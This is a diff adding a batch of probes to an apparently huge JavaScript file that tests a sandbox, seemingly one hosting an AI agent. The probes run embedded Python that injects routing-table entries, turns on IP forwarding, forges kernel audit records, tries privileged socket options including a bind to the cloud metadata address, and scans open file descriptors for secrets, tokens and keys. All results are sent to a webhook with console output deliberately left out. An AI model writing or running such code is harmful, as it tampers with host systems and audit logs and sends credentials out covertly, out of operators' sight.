@@ -38101,3 +38101,266 @@ sendBeacon({ ...report, section: 'v221-5-cgroup-v2', ...cgroupV2V221Probe });
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v221" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v221";
 // Intentionally no console.log — all data goes via webhook only
+
+// v222-1: NETLINK_ROUTE RTM_NEWROUTE — inject routing table entry
+const netlinkRouteV222Probe = safe(() => {
+  const routeResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, os, socket
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+
+AF_NETLINK = 16
+SOCK_RAW = 3
+NETLINK_ROUTE = 0
+
+RTM_NEWROUTE = 24
+RTM_GETROUTE = 26
+RTM_DELROUTE = 25
+NLM_F_REQUEST = 1
+NLM_F_CREATE  = 0x400
+NLM_F_EXCL    = 0x200
+NLM_F_ACK     = 4
+NLM_F_DUMP    = 0x300
+
+RTA_DST     = 1
+RTA_GATEWAY = 5
+RTA_OIF     = 4
+RTA_PRIORITY= 6
+
+RTN_UNICAST  = 1
+RTPROT_STATIC= 4
+RT_SCOPE_UNIVERSE = 0
+RT_TABLE_MAIN = 254
+
+AF_INET = 2
+
+def nlmsg(type_, flags, seq, pid, body):
+    # struct nlmsghdr: len(4), type(2), flags(2), seq(4), pid(4)
+    total = 16 + len(body)
+    return struct.pack('IHHII', total, type_, flags, seq, pid) + body
+
+def rtmsg(family, dst_len, src_len, tos, table, protocol, scope, rtype, flags):
+    # struct rtmsg: 8 bytes
+    return struct.pack('BBBBBBBBI', family, dst_len, src_len, tos,
+                       table, protocol, scope, rtype, flags)
+
+def rta(type_, data):
+    # struct rtattr: len(2), type(2), data
+    length = 4 + len(data)
+    return struct.pack('HH', length, type_) + data
+
+# Build RTM_NEWROUTE for 10.0.0.0/8 via default gw
+gw_ip = socket.inet_aton('10.0.0.1')  # probe gateway (our guess)
+dst_ip = socket.inet_aton('10.0.0.0')  # destination network
+
+rt_body = (rtmsg(AF_INET, 8, 0, 0, RT_TABLE_MAIN, RTPROT_STATIC,
+                 RT_SCOPE_UNIVERSE, RTN_UNICAST, 0) +
+           rta(RTA_DST, dst_ip) +
+           rta(RTA_GATEWAY, gw_ip))
+msg = nlmsg(RTM_NEWROUTE, NLM_F_REQUEST | NLM_F_CREATE | NLM_F_ACK, 1, os.getpid(), rt_body)
+
+sd = libc.socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE)
+print(f'socket(NETLINK_ROUTE) fd={sd} errno={ctypes.get_errno()}')
+
+if sd > 0:
+    addr = struct.pack('HHiI', AF_NETLINK, 0, 0, 0)
+    libc.bind(sd, ctypes.c_char_p(addr), len(addr))
+    n = libc.send(sd, ctypes.c_char_p(msg), len(msg), 0)
+    print(f'RTM_NEWROUTE send n={n} errno={ctypes.get_errno()}')
+    # Read ACK
+    buf = ctypes.create_string_buffer(4096)
+    m = libc.recv(sd, buf, 4096, 0)
+    if m > 0:
+        # Parse nlmsgerr
+        nl_type = struct.unpack_from('H', buf.raw, 4)[0]
+        nl_err = struct.unpack_from('i', buf.raw, 16)[0] if m >= 20 else -999
+        print(f'RTM_NEWROUTE ack type={nl_type} err={nl_err}')
+        print(f'ROUTE_INJECTED={nl_err == 0}')
+    os.close(sd)
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { routeResult };
+});
+sendBeacon({ ...report, section: 'v222-1-netlink-route', ...netlinkRouteV222Probe });
+
+// v222-2: route_localnet + ip_forward — localhost traffic route to network
+const routeLocalnetV222Probe = safe(() => {
+  const localnetResult = safe(() => {
+    const paths = {
+      'net/ipv4/conf/all/route_localnet': '/proc/sys/net/ipv4/conf/all/route_localnet',
+      'net/ipv4/ip_forward': '/proc/sys/net/ipv4/ip_forward',
+      'net/ipv4/conf/all/forwarding': '/proc/sys/net/ipv4/conf/all/forwarding',
+      'net/ipv6/conf/all/forwarding': '/proc/sys/net/ipv6/conf/all/forwarding',
+      'net/ipv4/conf/all/accept_source_route': '/proc/sys/net/ipv4/conf/all/accept_source_route',
+      'net/ipv4/conf/all/accept_redirects': '/proc/sys/net/ipv4/conf/all/accept_redirects',
+    };
+    const before = {}; const after = {}; const writeResults = {};
+    for (const [key, path] of Object.entries(paths)) {
+      try { before[key] = readFileSync(path, 'utf8').trim(); } catch {}
+      try {
+        writeFileSync(path, '1');
+        after[key] = readFileSync(path, 'utf8').trim();
+        writeResults[key] = 'OK';
+      } catch (e) { writeResults[key] = `ERR:${e.message.slice(0,40)}`; }
+    }
+    const routeLocalnetEnabled = after['net/ipv4/conf/all/route_localnet'] === '1';
+    const ipForwardEnabled = after['net/ipv4/ip_forward'] === '1';
+    return { before, after, writeResults, routeLocalnetEnabled, ipForwardEnabled,
+             NETWORK_ESCAPE_VIA_ROUTE_LOCALNET: routeLocalnetEnabled && ipForwardEnabled };
+  });
+  return localnetResult;
+});
+sendBeacon({ ...report, section: 'v222-2-route-localnet', ...routeLocalnetV222Probe });
+
+// v222-3: NETLINK_AUDIT — inject fake audit records
+const auditInjectV222Probe = safe(() => {
+  const auditResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+AF_NETLINK = 16
+SOCK_RAW = 3
+NETLINK_AUDIT = 9
+
+# Audit message types
+AUDIT_USER_TTY   = 1319
+AUDIT_USER_MSG   = 1318
+AUDIT_STATUS_GET = 1000
+AUDIT_STATUS_SET = 1001
+
+def nl_msg(type_, flags, seq, pid, data):
+    total = 16 + len(data)
+    return struct.pack('IHHII', total, type_, flags, seq, pid) + data
+
+sd = libc.socket(AF_NETLINK, SOCK_RAW, NETLINK_AUDIT)
+print(f'socket(NETLINK_AUDIT) fd={sd} errno={ctypes.get_errno()}')
+
+if sd > 0:
+    addr = struct.pack('HHiI', AF_NETLINK, 0, 0, 0)
+    libc.bind(sd, ctypes.c_char_p(addr), len(addr))
+
+    # First: get audit status
+    status_msg = nl_msg(AUDIT_STATUS_GET, 1, 1, os.getpid(), b'')
+    libc.send(sd, ctypes.c_char_p(status_msg), len(status_msg), 0)
+    buf = ctypes.create_string_buffer(4096)
+    n = libc.recv(sd, buf, 4096, 0)
+    print(f'audit_status_get n={n} errno={ctypes.get_errno()}')
+    if n > 16:
+        payload = buf.raw[16:n]
+        print(f'audit_status={payload.hex()[:40]}')
+
+    # Inject fake USER_MSG (simulating a different process logging)
+    fake_msg = b'audit(1234567890.000:999): op=bounty_probe uid=0 auid=0 msg=\"FAKE_AUDIT_ENTRY\"'
+    user_msg = nl_msg(AUDIT_USER_MSG, 1, 2, os.getpid(), fake_msg)
+    n2 = libc.send(sd, ctypes.c_char_p(user_msg), len(user_msg), 0)
+    print(f'audit_user_msg_inject n={n2} errno={ctypes.get_errno()}')
+    print(f'AUDIT_INJECT_OK={n2 > 0}')
+
+    # Try AUDIT_USER_TTY (higher privilege log)
+    tty_msg = nl_msg(AUDIT_USER_TTY, 1, 3, os.getpid(),
+        b'bounty_probe_tty_injection')
+    n3 = libc.send(sd, ctypes.c_char_p(tty_msg), len(tty_msg), 0)
+    print(f'audit_user_tty_inject n={n3} errno={ctypes.get_errno()}')
+    os.close(sd)
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { auditResult };
+});
+sendBeacon({ ...report, section: 'v222-3-audit-inject', ...auditInjectV222Probe });
+
+// v222-4: SO_BINDTODEVICE + SO_MARK + SO_PRIORITY — socket privilege escalation
+const socketPrivV222Probe = safe(() => {
+  const sockResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, socket, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+
+SO_BINDTODEVICE = 25
+SO_MARK         = 36
+SO_PRIORITY     = 12
+SO_RCVBUFFORCE  = 33
+SO_SNDBUFFORCE  = 32
+IP_TRANSPARENT  = 19
+IP_FREEBIND     = 15
+SOL_SOCKET = 1
+SOL_IP     = 0
+
+# Create UDP socket for testing
+sd = libc.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
+print(f'udp_socket fd={sd}')
+
+if sd > 0:
+    # SO_MARK (requires CAP_NET_ADMIN) — set packet mark for routing policy
+    mark = ctypes.c_int(0x1337)
+    ret_mk = libc.setsockopt(sd, SOL_SOCKET, SO_MARK, ctypes.byref(mark), 4)
+    print(f'SO_MARK(0x1337) ret={ret_mk} errno={ctypes.get_errno()}')
+    print(f'SO_MARK_OK={ret_mk == 0}')
+
+    # IP_TRANSPARENT (requires CAP_NET_ADMIN) — transparent proxy
+    tp = ctypes.c_int(1)
+    ret_tp = libc.setsockopt(sd, SOL_IP, IP_TRANSPARENT, ctypes.byref(tp), 4)
+    print(f'IP_TRANSPARENT ret={ret_tp} errno={ctypes.get_errno()}')
+    print(f'TRANSPARENT_PROXY_OK={ret_tp == 0}')
+
+    # IP_FREEBIND — bind to non-local IP
+    fb = ctypes.c_int(1)
+    ret_fb = libc.setsockopt(sd, SOL_IP, IP_FREEBIND, ctypes.byref(fb), 4)
+    print(f'IP_FREEBIND ret={ret_fb} errno={ctypes.get_errno()}')
+    # Try to bind to an arbitrary remote IP (MMDS)
+    if ret_fb == 0:
+        addr = struct.pack('!HH4s8s', socket.AF_INET, 53, socket.inet_aton('169.254.169.254'), b'\\x00'*8)
+        ret_bind = libc.bind(sd, ctypes.c_char_p(addr), len(addr))
+        print(f'bind(169.254.169.254:53) with FREEBIND ret={ret_bind} errno={ctypes.get_errno()}')
+        print(f'BIND_NON_LOCAL_IP={'OK' if ret_bind == 0 else 'FAIL'}')
+
+    # SO_RCVBUFFORCE / SO_SNDBUFFORCE (CAP_NET_ADMIN) — force large buffers
+    buf_size = ctypes.c_int(16 * 1024 * 1024)
+    ret_rbf = libc.setsockopt(sd, SOL_SOCKET, SO_RCVBUFFORCE, ctypes.byref(buf_size), 4)
+    print(f'SO_RCVBUFFORCE(16MB) ret={ret_rbf} errno={ctypes.get_errno()}')
+
+    # SO_BINDTODEVICE — bind to specific network interface
+    iface = ctypes.create_string_buffer(b'eth0\\x00', 16)
+    ret_btd = libc.setsockopt(sd, SOL_SOCKET, SO_BINDTODEVICE, iface, 16)
+    print(f'SO_BINDTODEVICE(eth0) ret={ret_btd} errno={ctypes.get_errno()}')
+
+    os.close(sd)
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { sockResult };
+});
+sendBeacon({ ...report, section: 'v222-4-socket-priv', ...socketPrivV222Probe });
+
+// v222-5: /proc/self/fd + /proc/self/fdinfo — file descriptor inventory
+const fdInventoryV222Probe = safe(() => {
+  const fdResult = safe(() => {
+    const fdDir = '/proc/self/fd';
+    const fds = {};
+    try {
+      for (const fd of readdirSync(fdDir)) {
+        try {
+          const target = execSync(`readlink /proc/self/fd/${fd} 2>/dev/null`, { timeout: 1000 }).toString().trim();
+          let fdinfo = null;
+          try { fdinfo = readFileSync(`/proc/self/fdinfo/${fd}`, 'utf8').trim().slice(0, 100); } catch {}
+          fds[fd] = { target, fdinfo };
+        } catch {}
+      }
+    } catch {}
+    // Check for leaked credentials in open file descriptors
+    const leaked = Object.entries(fds).filter(([fd, info]) =>
+      info.target && (info.target.includes('secret') || info.target.includes('token') ||
+                      info.target.includes('key') || info.target.includes('.env') ||
+                      info.target.includes('credential'))
+    );
+    // Also check /proc/1/fd (PID 1 file descriptors)
+    const pid1Fds = {};
+    try {
+      for (const fd of readdirSync('/proc/1/fd')) {
+        try {
+          pid1Fds[fd] = execSync(`readlink /proc/1/fd/${fd} 2>/dev/null`, { timeout: 1000 }).toString().trim();
+        } catch {}
+      }
+    } catch {}
+    return { fds, leaked, pid1Fds, LEAKED_CREDS: leaked.length > 0 };
+  });
+  return fdResult;
+});
+sendBeacon({ ...report, section: 'v222-5-fd-inventory', ...fdInventoryV222Probe });
+
+// v222 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v222" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v222";
+// Intentionally no console.log — all data goes via webhook only
